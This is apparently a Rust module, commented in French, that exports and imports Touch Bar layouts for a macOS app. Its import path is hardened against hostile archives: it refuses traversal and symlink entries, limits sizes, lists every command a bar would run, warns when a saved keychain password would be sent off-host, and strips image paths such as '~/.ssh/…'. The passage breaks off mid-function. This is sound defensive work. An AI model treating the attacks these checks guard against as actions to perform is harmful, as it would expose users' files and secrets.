//! Exporter et importer une barre : un `.toml` seul, ou un `.zip` avec `barre.toml` et `icones/` quand elle a des logos.
//!
//! L'import lit un fichier venu d'ailleurs : rien n'y est cru sur parole. L'archive est lue en mémoire, jamais
//! extraite sous ses propres noms ; une entrée avec `..`, un chemin absolu ou un lien symbolique fait refuser
//! toute l'archive ; seuls `barre.toml` et `icones/<image>` sont pris, dans des limites de taille ; les logos sont
//! redessinés en PNG (`icones::importer_en_png`) ; et tout ce que la barre peut lancer est listé avant la confirmation.

use super::icones;
use crate::actions::Action;
use crate::config::{self, Application, Barre, Element, Site, Source, SourceMcp};
use serde::Serialize;
use std::io::{Read, Write};
use std::path::{Path, PathBuf};

/// Taille maximale d'une archive importée.
const ARCHIVE_MAX: u64 = 10 * 1024 * 1024;
/// Taille maximale d'une image dans une archive (ou à côté d'un `.toml` importé).
const IMAGE_MAX: u64 = 2 * 1024 * 1024;
/// Taille maximale du `barre.toml`.
const TOML_MAX: u64 = 1024 * 1024;
/// Nombre maximal d'entrées dans une archive.
const FICHIERS_MAX: usize = 200;

/// Un texte dans les deux langues : la page choisit selon sa langue, la ligne de commande selon celle du système.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub(super) struct Texte {
    pub fr: String,
    pub en: String,
}

fn tx(fr: impl Into<String>, en: impl Into<String>) -> Texte {
    Texte { fr: fr.into(), en: en.into() }
}

/// Les erreurs de `config` n'existent qu'en français : la même phrase des deux côtés.
fn fr_seul(texte: String) -> Texte {
    Texte { fr: texte.clone(), en: texte }
}

impl Texte {
    pub fn dans(&self, fr: bool) -> &str {
        if fr { &self.fr } else { &self.en }
    }
}

/// Quelque chose que la barre fait sur ce Mac (programme, script, frappe, app, adresse, fichier lu, en-tête envoyé),
/// montré avant d'importer.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub(super) struct Commande {
    /// Où : « Barre principale, élément 3 « Build » ».
    pub ou: Texte,
    /// Quoi : « Commande shell », « Appui long : AppleScript »…
    pub quoi: Texte,
    /// Ce qui sera exécuté, tel qu'écrit dans le fichier.
    pub valeur: String,
    /// Un mot de passe du trousseau part vers une adresse qui n'est pas cette machine : alerte en tête de l'aperçu.
    pub alerte: bool,
}

impl Commande {
    /// La phrase d'alerte, quand `alerte` : « ⚠ Attention : cette barre lit ton mot de passe… ».
    fn phrase_d_alerte(&self) -> Texte {
        let minuscule = |s: &str| s.chars().next().map(|c| c.to_lowercase().chain(s.chars().skip(1)).collect::<String>()).unwrap_or_default();
        tx(
            format!("⚠ Attention : cette barre {}. Ne l’importe que si tu as confiance en son auteur.", minuscule(&self.quoi.fr)),
            format!("⚠ Warning: this bar {}. Only import it if you trust its author.", minuscule(&self.quoi.en)),
        )
    }
}

// ---------- Parcours de la barre ----------

/// Chaque `image` de la barre (principale, groupes, barres d'application), modifiable sur place.
fn chaque_image(barre: &mut Barre, f: &mut impl FnMut(&mut String)) {
    fn dans(elements: &mut [Element], f: &mut impl FnMut(&mut String)) {
        for e in elements {
            match e {
                Element::Bouton { image: Some(i), .. } => f(i),
                Element::Groupe { elements, .. } => dans(elements, f),
                _ => {}
            }
        }
    }
    dans(&mut barre.elements, f);
    for elements in barre.applications.iter_mut().map(|a| &mut a.elements).chain(barre.sites.iter_mut().map(|s| &mut s.elements)) {
        dans(elements, f);
    }
}

/// Les chemins d'image de la barre, sans doublon, dans l'ordre.
fn images(barre: &Barre) -> Vec<String> {
    let mut liste = Vec::new();
    chaque_image(&mut barre.clone(), &mut |i| {
        if !liste.contains(i) {
            liste.push(i.clone());
        }
    });
    liste
}

/// `~/x.png` → `/Users/moi/x.png`, comme la barre le lit.
fn deplier(chemin: &str) -> PathBuf {
    match chemin.strip_prefix("~/") {
        Some(suite) => PathBuf::from(std::env::var("HOME").unwrap_or_default()).join(suite),
        None => PathBuf::from(chemin),
    }
}

/// Tout ce que la barre fait sur ce Mac, dans l'ordre de la barre (principale d'abord) puis des sources : actions
/// `shell`, `applescript`, `touche`, `keycode`, `app`, `url` autre que http(s), actions système (app d'Apple ou
/// frappe simulée), apps des `lanceur`, commandes des `script`, images lues hors de `icones/`, et pour chaque
/// `[[source]]` sa commande, son serveur MCP lancé ou appelé, l'adresse lue et chacun de ses en-têtes (un
/// `trousseau:` y est nommé : c'est un mot de passe de l'utilisateur qui part avec la requête).
///
/// Chaque type et chaque champ est nommé, sans `..` ni `_ =>` : un élément, une action, une source ou un champ
/// ajouté plus tard ne compile pas tant qu'il n'est pas classé ici.
pub(super) fn commandes(barre: &Barre) -> Vec<Commande> {
    let Barre { masquer_control_strip: _, elements, applications, sites, sources } = barre;
    let mut liste = Vec::new();
    parcourir(elements, &tx("Barre principale", "Main bar"), "", &mut liste);
    for Application { app, herite: _, elements } in applications {
        parcourir(elements, &tx(format!("Barre de « {app} »"), format!("“{app}” bar")), "", &mut liste);
    }
    // Une barre de site fait lire à Tactile l'adresse de l'onglet actif : c'est dit avant ses éléments.
    for Site { adresse, herite: _, elements } in sites {
        let ou = tx(format!("Barre du site « {adresse} »"), format!("“{adresse}” site bar"));
        let quoi = tx(format!("Change la barre sur {adresse} ; lit l’adresse de l’onglet actif de tes navigateurs"), format!("Changes the bar on {adresse}; reads the address of your browsers’ active tab"));
        liste.push(ligne(&ou, quoi, adresse.clone()));
        parcourir(elements, &ou, "", &mut liste);
    }
    for source in sources {
        lister_source(source, &mut liste);
    }
    liste
}

fn ligne(ou: &Texte, quoi: Texte, valeur: impl Into<String>) -> Commande {
    Commande { ou: ou.clone(), quoi, valeur: valeur.into(), alerte: false }
}

fn lister_source(source: &Source, liste: &mut Vec<Commande>) {
    let Source { nom, http, commande, mcp, toutes_les, entetes } = source;
    let ou = tx(format!("Source « {nom} »"), format!("“{nom}” source"));
    let n = toutes_les.unwrap_or(crate::sources::DEFAUT);
    if let Some(c) = commande {
        liste.push(ligne(&ou, tx(format!("Commande relancée toutes les {n} s"), format!("Command run every {n} s")), c));
    }
    if let Some(u) = http {
        liste.push(ligne(&ou, tx(format!("Adresse lue toutes les {n} s"), format!("Address fetched every {n} s")), u));
    }
    // Où partent les en-têtes : l'adresse http, sinon celle du serveur MCP distant (comme `sources::lire`).
    let mut destination = http.as_deref();
    if let Some(SourceMcp { commande, url, outil, arguments: _ }) = mcp {
        if let Some(c) = commande {
            liste.push(ligne(&ou, tx(format!("Serveur MCP lancé (outil « {outil} »)"), format!("MCP server started (tool “{outil}”)")), c));
        }
        if let Some(u) = url {
            liste.push(ligne(&ou, tx(format!("Serveur MCP distant appelé (outil « {outil} »)"), format!("Remote MCP server called (tool “{outil}”)")), u));
            destination = destination.or(Some(u));
        }
    }
    // Sans adresse, les en-têtes ne sont ni lus ni envoyés.
    let Some(destination) = destination else { return };
    let hote = hote(destination);
    for (cle, valeur) in entetes {
        // Les services `trousseau:x` de la valeur, découpés comme à l'exécution.
        let mut services = Vec::new();
        let _ = crate::sources::deverrouiller(valeur, &mut services, |s| Ok(s.to_string()));
        let texte = format!("{cle}: {valeur}");
        if services.is_empty() {
            liste.push(ligne(&ou, tx(format!("En-tête envoyé à {hote}"), format!("Header sent to {hote}")), texte.clone()));
        }
        for s in services {
            let quoi = tx(format!("Lit ton mot de passe enregistré « {s} » et l’envoie à {hote}"), format!("Reads your saved password “{s}” and sends it to {hote}"));
            liste.push(Commande { alerte: !local(destination), ..ligne(&ou, quoi, texte.clone()) });
        }
    }
}

/// L'hôte d'une adresse, sans identifiants ni port : `https://a:b@exemple.org:8443/x` → `exemple.org`.
fn hote(url: &str) -> &str {
    let reste = url.split_once("://").map_or(url, |(_, r)| r);
    let autorite = reste.split(['/', '?', '#']).next().unwrap_or_default();
    let autorite = autorite.rsplit_once('@').map_or(autorite, |(_, h)| h);
    match autorite.rsplit_once(':') {
        Some((h, port)) if !h.is_empty() && !port.is_empty() && port.bytes().all(|o| o.is_ascii_digit()) => h,
        _ => autorite,
    }
}

/// L'adresse vise-t-elle cette machine ?
fn local(url: &str) -> bool {
    ["localhost", "127.0.0.1", "[::1]"].contains(&hote(url))
}

fn parcourir(elements: &[Element], barre: &Texte, parent: &str, liste: &mut Vec<Commande>) {
    for (i, e) in elements.iter().enumerate() {
        let numero = format!("{parent}{}", i + 1);
        // Le nom montré seulement : un type oublié ici perd son nom, pas sa ligne.
        let (nom_fr, nom_en) = match e {
            Element::Bouton { texte: Some(t), .. } | Element::Groupe { texte: Some(t), .. } if !t.is_empty() => (format!(" « {t} »"), format!(" “{t}”")),
            _ => (String::new(), String::new()),
        };
        let ou = tx(format!("{}, élément {numero}{nom_fr}", barre.fr), format!("{}, item {numero}{nom_en}", barre.en));
        let appui_long = |a: &Option<Action>, liste: &mut Vec<Commande>| {
            if let Some(c) = a.as_ref().and_then(lancement) {
                let quoi = tx(format!("{} (appui long)", c.quoi.fr), format!("{} (long press)", c.quoi.en));
                liste.push(Commande { ou: ou.clone(), quoi, ..c });
            }
        };
        let action = |a: &Option<Action>, liste: &mut Vec<Commande>| liste.extend(a.as_ref().and_then(lancement).map(|c| Commande { ou: ou.clone(), ..c }));
        match e {
            Element::Bouton { texte: _, symbole: _, image, gabarit: _, couleur: _, couleur_texte: _, taille: _, affichage: _, largeur: _, action: a, appui_long: l, source: _ } => {
                // `icones/x.png` : le logo emporté avec la barre ; tout autre chemin est un fichier de ce Mac.
                if let Some(i) = image.as_ref().filter(|i| nom_d_icone(i).is_none()) {
                    liste.push(ligne(&ou, tx("Lit un fichier de ton Mac", "Reads a file on your Mac"), i));
                }
                action(a, liste);
                appui_long(l, liste);
            }
            Element::Lanceur { app, texte: _, affichage: _, largeur: _, appui_long: l } => {
                liste.push(ligne(&ou, tx("Ouvre l’app", "Opens the app"), app));
                appui_long(l, liste);
            }
            Element::Script { commande, intervalle, delai: _, largeur: _, action: a } => {
                liste.push(ligne(&ou, tx(format!("Commande relancée toutes les {intervalle} s"), format!("Command run every {intervalle} s")), commande));
                action(a, liste);
            }
            Element::Texte { source: _, gabarit: _, symbole_selon: _, couleur_selon: _, largeur: _, action: a } => action(a, liste),
            Element::Groupe { texte: _, symbole: _, largeur: _, elements } => parcourir(elements, barre, &format!("{numero} › "), liste),
            // Rien ne sort de la barre : affichage, réglage, heure, morceau en cours, pile.
            Element::Slider { reglage: _, symbole: _ }
            | Element::Heure { format: _ }
            | Element::EnCours { largeur: _ }
            | Element::Espace { largeur: _ }
            | Element::Souple
            | Element::Batterie { symbole: _, largeur: _ } => {}
        }
    }
}

/// L'action lance-t-elle quelque chose ? Le champ `ou` est rempli par l'appelant.
fn lancement(action: &Action) -> Option<Commande> {
    let (quoi, valeur) = match action {
        Action::Shell(s) => (tx("Commande shell", "Shell command"), s.clone()),
        Action::Applescript(s) => (tx("AppleScript", "AppleScript"), s.clone()),
        Action::Touche(t) => (tx("Raccourci clavier", "Keyboard shortcut"), String::from(t.clone())),
        Action::Keycode(n) => (tx("Touche simulée", "Simulated key"), format!("keycode {n}")),
        Action::App(a) => (tx("Ouvre l’app", "Opens the app"), a.clone()),
        // Une page web s'ouvre dans le navigateur ; tout autre schéma (`file:`, `ssh:`, une app) est montré.
        Action::Url(u) if ["http://", "https://"].iter().any(|p| u.to_lowercase().starts_with(p)) => return None,
        Action::Url(u) => (tx("Ouvre l’adresse", "Opens the address"), u.clone()),
        // Les actions système : une app d'Apple lancée, ou une frappe simulée (comme `touche`).
        Action::MissionControl => (tx("Ouvre Mission Control", "Opens Mission Control"), nom(action)),
        Action::FenetresApp => (tx("Montre les fenêtres de l’app (Mission Control)", "Shows the app’s windows (Mission Control)"), nom(action)),
        Action::Bureau => (tx("Affiche le bureau (Mission Control)", "Shows the desktop (Mission Control)"), nom(action)),
        Action::Launchpad => (tx("Ouvre Launchpad", "Opens Launchpad"), nom(action)),
        Action::CaptureOptions => (tx("Ouvre l’outil de capture d’écran", "Opens the screenshot tool"), nom(action)),
        Action::Spotlight => (tx("Ouvre Spotlight (simule ⌘ espace)", "Opens Spotlight (simulates ⌘ space)"), nom(action)),
        Action::CaptureEcran => (tx("Capture l’écran (simule ⌘⇧3)", "Takes a screenshot (simulates ⌘⇧3)"), nom(action)),
        Action::CaptureZone => (tx("Capture une zone (simule ⌘⇧4)", "Screenshots an area (simulates ⌘⇧4)"), nom(action)),
        Action::Emojis => (tx("Ouvre les émojis (simule ⌃⌘ espace)", "Opens emoji (simulates ⌃⌘ space)"), nom(action)),
        Action::Verrouiller => (tx("Verrouille l’écran (simule ⌃⌘Q)", "Locks the screen (simulates ⌃⌘Q)"), nom(action)),
        Action::ForcerQuitter => (tx("Ouvre « Forcer à quitter » (simule ⌥⌘esc)", "Opens “Force Quit” (simulates ⌥⌘esc)"), nom(action)),
        // Réglages, touches média, veille de l'écran, Échap, barre d'Apple : rien n'est lancé.
        Action::LuminositePlus
        | Action::LuminositeMoins
        | Action::Luminosite(_)
        | Action::VolumePlus
        | Action::VolumeMoins
        | Action::Volume(_)
        | Action::BasculerMuet
        | Action::LecturePause
        | Action::Suivant
        | Action::Precedent
        | Action::Veille
        | Action::Echap
        | Action::BarreApple => return None,
    };
    Some(Commande { ou: tx("", ""), quoi, valeur, alerte: false })
}

/// L'action telle qu'écrite dans le fichier : `verrouiller`.
fn nom(action: &Action) -> String {
    serde_json::to_value(action).ok().and_then(|v| v.as_str().map(String::from)).unwrap_or_default()
}

// ---------- Export ----------

/// Le résultat d'un export : le fichier écrit, le nombre de logos emportés, les avertissements.
#[derive(Debug)]
pub(super) struct Export {
    pub fichier: PathBuf,
    pub logos: usize,
    pub avis: Vec<Texte>,
}

/// Nombre de logos (images locales) de la barre : au-delà de zéro, l'export se fait en `.zip`.
pub(super) fn logos(barre: &Barre) -> usize {
    images(barre).len()
}

/// Le fichier réellement écrit : `.zip` ou `.toml` demandé tel quel ; sans l'une de ces extensions, `.zip` s'il y a
/// des logos, sinon `.toml`.
pub(super) fn destination(cible: &Path, logos: usize) -> PathBuf {
    match extension(cible).as_str() {
        "zip" | "toml" => cible.to_path_buf(),
        _ => {
            let mut nom = cible.as_os_str().to_owned();
            nom.push(if logos > 0 { ".zip" } else { ".toml" });
            nom.into()
        }
    }
}

fn extension(chemin: &Path) -> String {
    chemin.extension().map(|e| e.to_string_lossy().to_lowercase()).unwrap_or_default()
}

/// Écrit la barre dans `cible` (voir `destination`). `original` : le texte du fichier, recopié tel quel (commentaires
/// compris) quand l'export est un `.toml`. Un `.toml` avec des logos garde leurs chemins absolus : un avertissement le dit.
pub(super) fn exporter(barre: &Barre, original: Option<&str>, cible: &Path) -> Result<Export, Texte> {
    let chemins = images(barre);
    let fichier = destination(cible, chemins.len());
    let ecrire_erreur = |e: &dyn std::fmt::Display| tx(format!("impossible d'écrire {} : {e}", fichier.display()), format!("can't write {}: {e}", fichier.display()));
    if extension(&fichier) == "toml" {
        let texte = match original {
            Some(t) => t.to_string(),
            None => config::ecrire(barre).map_err(fr_seul)?,
        };
        std::fs::write(&fichier, texte).map_err(|e| ecrire_erreur(&e))?;
        let avis = if chemins.is_empty() {
            vec![]
        } else {
            vec![tx(
                format!("le .toml n'emporte pas tes {} : ils restent des chemins de ce Mac. Exporte en .zip pour les inclure", config::nombre(chemins.len(), "logo")),
                format!("the .toml doesn't carry your {} logo(s): they stay as paths on this Mac. Export as .zip to include them", chemins.len()),
            )]
        };
        return Ok(Export { fichier, logos: 0, avis });
    }
    // Un .zip : barre.toml aux chemins relatifs `icones/x.png`, et seulement les images qu'elle utilise.
    let mut barre = barre.clone();
    let mut fichiers: Vec<(String, Vec<u8>)> = Vec::new();
    let mut avis = Vec::new();
    let mut noms: Vec<(String, String)> = Vec::new();
    for chemin in &chemins {
        let source = deplier(chemin);
        let Ok(octets) = std::fs::read(&source) else {
            avis.push(tx(format!("image « {chemin} » introuvable : son chemin reste tel quel"), format!("image “{chemin}” not found: its path stays as is")));
            continue;
        };
        let base = source.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_else(|| "image.png".into());
        // Deux images de même nom venues de dossiers différents : la seconde prend un suffixe.
        let mut nom = base.clone();
        let mut n = 2;
        while fichiers.iter().any(|(f, _)| *f == format!("icones/{nom}")) {
            let p = Path::new(&base);
            nom = format!("{}-{n}.{}", p.file_stem().unwrap_or_default().to_string_lossy(), extension(p));
            n += 1;
        }
        fichiers.push((format!("icones/{nom}"), octets));
        noms.push((chemin.clone(), format!("icones/{nom}")));
    }
    chaque_image(&mut barre, &mut |i| {
        if let Some((_, relatif)) = noms.iter().find(|(c, _)| c == i) {
            *i = relatif.clone();
        }
    });
    let toml = config::ecrire(&barre).map_err(fr_seul)?;
    let sortie = std::fs::File::create(&fichier).map_err(|e| ecrire_erreur(&e))?;
    let mut zip = zip::ZipWriter::new(sortie);
    let options = zip::write::SimpleFileOptions::default().compression_method(zip::CompressionMethod::Deflated);
    let logos = fichiers.len();
    for (nom, octets) in std::iter::once(("barre.toml".to_string(), toml.into_bytes())).chain(fichiers) {
        zip.start_file(nom, options).map_err(|e| ecrire_erreur(&e))?;
        zip.write_all(&octets).map_err(|e| ecrire_erreur(&e))?;
    }
    zip.finish().map_err(|e| ecrire_erreur(&e))?;
    Ok(Export { fichier, logos, avis })
}

// ---------- Import ----------

/// Une barre importée, lue et vérifiée, pas encore installée. Ses images pointent vers des copies temporaires
/// (l'aperçu les affiche) ; le dossier temporaire disparaît avec elle.
#[derive(Debug)]
pub(super) struct Paquet {
    pub barre: Barre,
    pub commandes: Vec<Commande>,
    pub avis: Vec<Texte>,
    /// Les images à copier dans `icones/` à l'installation (chemins absolus, tels qu'écrits dans `barre`).
    sources: Vec<String>,
    temporaire: Option<PathBuf>,
}

impl Drop for Paquet {
    fn drop(&mut self) {
        if let Some(d) = &self.temporaire {
            let _ = std::fs::remove_dir_all(d);
        }
    }
}

/// Lit un fichier à importer : `.zip` (reconnu à sa signature, pas à son nom) ou `.toml`.
pub(super) fn ouvrir(fichier: &Path) -> Result<Paquet, Texte> {
    let meta = std::fs::metadata(fichier).map_err(|e| tx(format!("impossible de lire {} : {e}", fichier.display()), format!("can't read {}: {e}", fichier.display())))?;
    if !meta.is_file() {
        return Err(tx(format!("{} n'est pas un fichier", fichier.display()), format!("{} is not a file", fichier.display())));
    }
    if meta.len() > ARCHIVE_MAX {
        return Err(trop_lourd("le fichier", "the file", ARCHIVE_MAX));
    }
    let octets = std::fs::read(fichier).map_err(|e| tx(format!("impossible de lire {} : {e}", fichier.display()), format!("can't read {}: {e}", fichier.display())))?;
    ouvrir_octets(octets, fichier.parent())
}

fn trop_lourd(fr: &str, en: &str, max: u64) -> Texte {
    let mo = max / (1024 * 1024);
    tx(format!("{fr} est trop lourd : {mo} Mo au plus"), format!("{en} is too large: {mo} MB at most"))
}

/// Le contenu d'un fichier à importer (lu sur disque ou déposé dans la page). `voisin` : le dossier du fichier,
/// où un `.toml` seul peut trouver ses `icones/` ; `None` pour un fichier déposé.
pub(super) fn ouvrir_octets(octets: Vec<u8>, voisin: Option<&Path>) -> Result<Paquet, Texte> {
    if octets.len() as u64 > ARCHIVE_MAX {
        return Err(trop_lourd("le fichier", "the file", ARCHIVE_MAX));
    }
    if octets.starts_with(b"PK\x03\x04") || octets.starts_with(b"PK\x05\x06") {
        return ouvrir_zip(octets);
    }
    if octets.len() as u64 > TOML_MAX {
        return Err(trop_lourd("le fichier de barre", "the bar file", TOML_MAX));
    }
    let texte = String::from_utf8(octets).map_err(|_| tx("ce fichier n'est ni un .toml ni un .zip", "this file is neither a .toml nor a .zip"))?;
    let mut temporaire = None;
    let sources = match voisin {
        // Un .toml à côté de son dossier icones/ (un .zip décompressé) : ses chemins relatifs sont pris comme dans une archive.
        Some(dossier) => {
            let d = dossier_temporaire()?;
            let copies = copier_voisines(&texte, dossier, &d).inspect_err(|_| {
                let _ = std::fs::remove_dir_all(&d);
            })?;
            temporaire = Some(d);
            copies
        }
        None => vec![],
    };
    preparer(&texte, sources, temporaire)
}

/// Pour un `.toml` seul : chaque image relative `icones/x.png` qui existe à côté est recopiée (≤ 2 Mo, fichier
/// ordinaire, pas un lien) dans le dossier temporaire. Renvoie les paires (chemin écrit, copie).
fn copier_voisines(texte: &str, dossier: &Path, temporaire: &Path) -> Result<Vec<(String, PathBuf)>, Texte> {
    let barre = config::lire(texte).map_err(fr_seul)?;
    let mut copies = Vec::new();
    for chemin in images(&barre) {
        let Some(nom) = nom_d_icone(&chemin) else { continue };
        let source = dossier.join(&chemin);
        let Ok(meta) = std::fs::symlink_metadata(&source) else { continue };
        if !meta.is_file() {
            return Err(tx(format!("« {chemin} » n'est pas un fichier ordinaire (lien symbolique ?)"), format!("“{chemin}” is not a regular file (symbolic link?)")));
        }
        if meta.len() > IMAGE_MAX {
            return Err(trop_lourd(&format!("l'image « {chemin} »"), &format!("the image “{chemin}”"), IMAGE_MAX));
        }
        let copie = temporaire.join("icones").join(nom);
        std::fs::copy(&source, &copie).map_err(|e| tx(format!("copie de « {chemin} » : {e}"), format!("copying “{chemin}”: {e}")))?;
        copies.push((chemin, copie));
    }
    Ok(copies)
}

/// `icones/x.png` → `x.png`, si c'est bien une image directement dans `icones/` au nom sans piège.
fn nom_d_icone(chemin: &str) -> Option<&str> {
    let nom = chemin.strip_prefix("icones/")?;
    let ok = !nom.is_empty()
        && nom.len() <= 255
        && !nom.starts_with('.')
        && !nom.contains(['/', '\\', '\0'])
        && icones::FORMATS.contains(&extension(Path::new(nom)).as_str());
    ok.then_some(nom)
}

fn dossier_temporaire() -> Result<PathBuf, Texte> {
    use std::sync::atomic::{AtomicUsize, Ordering};
    static N: AtomicUsize = AtomicUsize::new(0);
    let d = std::env::temp_dir().join(format!("tactile-import-{}-{}", std::process::id(), N.fetch_add(1, Ordering::Relaxed)));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(d.join("icones")).map_err(|e| tx(format!("dossier temporaire : {e}"), format!("temporary folder: {e}")))?;
    Ok(d)
}

/// Le nom d'une entrée d'archive est-il dangereux ? `..`, chemin absolu (`/x`, `\x`, `C:`) : oui.
fn entree_dangereuse(nom: &str) -> bool {
    let absolu = nom.starts_with(['/', '\\']) || nom.as_bytes().get(1) == Some(&b':');
    absolu || nom.split(['/', '\\']).any(|c| c == "..")
}

fn ouvrir_zip(octets: Vec<u8>) -> Result<Paquet, Texte> {
    let illisible = |e: &dyn std::fmt::Display| tx(format!("archive illisible : {e}"), format!("unreadable archive: {e}"));
    let mut archive = zip::ZipArchive::new(std::io::Cursor::new(octets)).map_err(|e| illisible(&e))?;
    if archive.len() > FICHIERS_MAX {
        return Err(tx(format!("l'archive contient trop de fichiers : {FICHIERS_MAX} au plus"), format!("the archive has too many files: {FICHIERS_MAX} at most")));
    }
    // Le crate ne garde qu'une entrée par nom, peut-être pas celle qu'un autre outil montre : deux barre.toml, deux logos.
    if archive.has_duplicate_names() {
        return Err(tx("archive refusée : deux entrées portent le même nom", "archive refused: two entries have the same name"));
    }
    let temporaire = dossier_temporaire()?;
    // Le dossier temporaire part avec le paquet, ou ici en cas de refus.
    let resultat = (|| {
        let mut toml = None;
        let mut sources = Vec::new();
        let mut ignores = Vec::new();
        for k in 0..archive.len() {
            let mut entree = archive.by_index(k).map_err(|e| illisible(&e))?;
            let nom = entree.name().map_err(|e| illisible(&e))?.into_owned();
            if entree_dangereuse(&nom) {
                return Err(tx(format!("archive refusée : l'entrée « {nom} » sort de son dossier"), format!("archive refused: entry “{nom}” points outside its folder")));
            }
            if entree.is_symlink() {
                return Err(tx(format!("archive refusée : « {nom} » est un lien symbolique"), format!("archive refused: “{nom}” is a symbolic link")));
            }
            if entree.is_dir() {
                continue;
            }
            let max = if nom == "barre.toml" {
                TOML_MAX
            } else if nom_d_icone(&nom).is_some() {
                IMAGE_MAX
            } else {
                ignores.push(nom);
                continue;
            };
            let (fr, en) = if max == TOML_MAX { ("barre.toml".to_string(), "barre.toml".to_string()) } else { (format!("l'image « {nom} »"), format!("the image “{nom}”")) };
            if entree.size() > max {
                return Err(trop_lourd(&fr, &en, max));
            }
            // La taille annoncée peut mentir : on ne lit jamais plus que la limite.
            let mut contenu = Vec::new();
            (&mut entree).take(max + 1).read_to_end(&mut contenu).map_err(|e| illisible(&e))?;
            if contenu.len() as u64 > max {
                return Err(trop_lourd(&fr, &en, max));
            }
            if nom == "barre.toml" {
                toml = Some(String::from_utf8(contenu).map_err(|_| tx("barre.toml n'est pas du texte UTF-8", "barre.toml is not UTF-8 text"))?);
            } else {
                // Écrit sous un nom vérifié par `nom_d_icone`, dans notre dossier temporaire.
                let copie = temporaire.join(&nom);
                std::fs::write(&copie, contenu).map_err(|e| tx(format!("dossier temporaire : {e}"), format!("temporary folder: {e}")))?;
                sources.push((nom, copie));
            }
        }
        let toml = toml.ok_or_else(|| tx("l'archive ne contient pas de barre.toml à sa racine", "the archive has no barre.toml at its root"))?;
        Ok((toml, sources, ignores))
    })();
    match resultat {
        Ok((toml, sources, ignores)) => {
            let mut paquet = preparer(&toml, sources, Some(temporaire))?;
            if !ignores.is_empty() {
                let liste = ignores.join(", ");
                paquet.avis.push(tx(format!("ignoré dans l'archive : {liste}"), format!("ignored in the archive: {liste}")));
            }
            Ok(paquet)
        }
        Err(e) => {
            let _ = std::fs::remove_dir_all(&temporaire);
            Err(e)
        }
    }
}

/// Le texte de la barre et ses images déjà copiées à part : lecture, chemins des images vers les copies, validation.
fn preparer(texte: &str, copies: Vec<(String, PathBuf)>, temporaire: Option<PathBuf>) -> Result<Paquet, Texte> {
    let nettoyer = |e: Texte| {
        if let Some(d) = &temporaire {
            let _ = std::fs::remove_dir_all(d);
        }
        e
    };
    // Avant tout aperçu (donc tout décodage) : une image qui annonce des dimensions géantes est refusée sur son en-tête.
    for (nom, copie) in &copies {
        if let Err(e) = crate::barre::controler_image(&copie.to_string_lossy()) {
            let en = e.replace("image trop grande : ", "image too large: ").replace("maximum", "at most");
            return Err(nettoyer(tx(format!("logo « {nom} » refusé, {e}"), format!("logo “{nom}” refused, {en}"))));
        }
    }
    let mut barre = config::lire(texte).map_err(fr_seul).map_err(nettoyer)?;
    let ignorees = retirer_images_hors_barre(&mut barre);
    // Avant que les logos pointent vers leurs copies temporaires : ce sont des fichiers de la barre, pas de ce Mac.
    let liste = commandes(&barre);
    let mut sources = Vec::new();
    let mut absentes = Vec::new();
    chaque_image(&mut barre, &mut |i| {
        if let Some((_, copie)) = copies.iter().find(|(c, _)| c == i) {
            *i = copie.to_string_lossy().into_owned();
            if !sources.contains(i) {
                sources.push(i.clone());
            }
        } else if nom_d_icone(i).is_some() && !absentes.contains(i) {
            absentes.push(i.clone());
        }
    });
    let mut paquet = Paquet { barre, commandes: liste, avis: vec![], sources, temporaire };
    // Le validateur partagé avec `--verifier` : une barre inutilisable est refusée, le reste devient un avis.
    // Situé par élément, pas par ligne : la personne qui importe n'a pas ce fichier sous les yeux (Lise, 0.3).
    for avis in config::controler(&paquet.barre, Some(texte)) {
        let situe = if avis.lieu.is_empty() { avis.message } else { format!("{} : {}", avis.lieu, avis.message) };
        if avis.grave {
            return Err(fr_seul(situe));
        }
        paquet.avis.push(fr_seul(situe));
    }
    super::verifier(&paquet.barre.elements).map_err(fr_seul)?;
    for app in &paquet.barre.applications {
        super::verifier(&app.elements).map_err(|e| fr_seul(format!("application « {} », {e}", app.app)))?;
    }
    for site in &paquet.barre.sites {
        super::verifier(&site.elements).map_err(|e| fr_seul(format!("site « {} », {e}", site.adresse)))?;
    }
    if !absentes.is_empty() {
        let liste = absentes.join(", ");
        paquet.avis.push(tx(format!("logo absent du fichier importé : {liste}"), format!("logo missing from the imported file: {liste}")));
    }
    if !ignorees.is_empty() {
        let liste = ignorees.join(", ");
        paquet.avis.push(tx(format!("image ignorée : chemin hors de la barre importée ({liste})"), format!("image ignored: path outside the imported bar ({liste})")));
    }
    Ok(paquet)
}

/// Une barre importée n'a pas à lire `/etc/…` ou `~/.ssh/…` : toute `image` qui n'est pas un `icones/<nom>` de
/// l'archive est retirée. Le bouton garde son texte ou son symbole ; s'il n'a ni l'un ni l'autre, il prend `photo`.
/// Renvoie les chemins retirés, sans doublon.
fn retirer_images_hors_barre(barre: &mut Barre) -> Vec<String> {
    fn dans(elements: &mut [Element], retirees: &mut Vec<String>) {
        for e in elements {
            match e {
                Element::Bouton { image, symbole, texte, .. } => {
                    if let Some(i) = image.take_if(|i| nom_d_icone(i).is_none()) {
                        if symbole.is_none() && texte.as_deref().is_none_or(str::is_empty) {
                            *symbole = Some("photo".into());
                        }
                        if !retirees.contains(&i) {
                            retirees.push(i);
                        }
                    }
                }
                Element::Groupe { elements, .. } => dans(elements, retirees),
                _ => {}
            }
        }
    }
    let mut retirees = Vec::new();
    dans(&mut barre.elements, &mut retirees);
    for elements in barre.applications.iter_mut().map(|a| &mut a.elements).chain(barre.sites.iter_mut().map(|s| &mut s.elements)) {
        dans(elements, &mut retirees);
    }
    retirees
}

impl Paquet {
    /// Nombre de logos que l'installation copiera.
    pub fn logos(&self) -> usize {
        self.sources.len()
    }

    /// Les alertes à montrer en tête de l'aperçu : un mot de passe du trousseau envoyé hors de cette machine.
    pub fn alertes(&self) -> Vec<Texte> {
        self.commandes.iter().filter(|c| c.alerte).map(Commande::phrase_d_alerte).collect()
    }
}

/// Installe la barre importée à la place de `config` : logos redessinés en PNG dans `icones/` (même nommage stable
/// que l'éditeur), chemins réécrits, puis écriture par `enregistrer` (la barre actuelle part dans l'historique,
/// ses commentaires dans `.manuel`). Renvoie le nom de la copie `.manuel` quand elle vient d'être faite.
pub(super) fn installer(paquet: &Paquet, config: &Path) -> Result<Option<String>, Texte> {
    let dossier = icones::dossier(config);
    let mut barre = paquet.barre.clone();
    let mut copies: Vec<(String, String)> = Vec::new();
    for source in &paquet.sources {
